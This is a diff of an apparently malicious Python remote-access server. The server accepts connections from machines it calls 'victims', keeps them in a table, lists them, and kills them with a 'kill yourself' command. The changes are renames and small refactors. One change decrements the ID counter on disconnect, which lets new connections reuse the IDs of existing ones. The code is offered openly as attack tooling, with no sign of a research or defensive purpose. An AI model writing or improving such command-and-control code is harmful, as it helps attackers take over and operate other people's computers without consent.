@@ -14,7 +14,7 @@ class InteractVictim():
         victim_cmd = {
             "help\t": "Print this help menu.",
             "back\t": "Return to the console(background to current connection).",
-            "    \t": "All default windows command."
+            "    \t": "All default commands of the system."
         }
 
         print("[+] Help menu.\n")
@@ -86,7 +86,7 @@ class Server():
         self.is_server_on = False
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.victims_dict = {} # Stores conn of the victim(s)
-        self.victim_count = 0
+        self.victim_id = 0
         self.console_cmd = {
             "help\t": "Print this help menu.",
             "exit\t": "Exit the program",
@@ -103,10 +103,10 @@ class Server():
 
             try:
                 conn, addr = self.sock.accept()
-                self.victim_count += 1
+                self.victim_id += 1
                 print(f"Got connection from {addr}")
 
-                self.victims_dict.update({self.victim_count: conn})
+                self.victims_dict.update({self.victim_id: conn})
 
             except Exception as e:
                 print(e)
@@ -119,10 +119,11 @@ class Server():
         try:
             print(f"[+] Closing connection with {conn}")
 
-            conn.send("kill yourself")
-            time.sleep(1)
+            self.victim_console._send(conn, "kill yourself")
+            time.sleep(0.5)
             conn.close()
 
+            self.victim_id -= 1
             self.victims_dict.pop(victim_id)
 
         except Exception as e:
@@ -166,7 +167,7 @@ class Server():
         return True
 
     def _list_victims(self):
-        print(f"[+] Total {self.victim_count} victims...")
+        print(f"[+] Total {self.victim_id} victims...")
         print("ID\tVictim")
 
         for id in self.victims_dict:
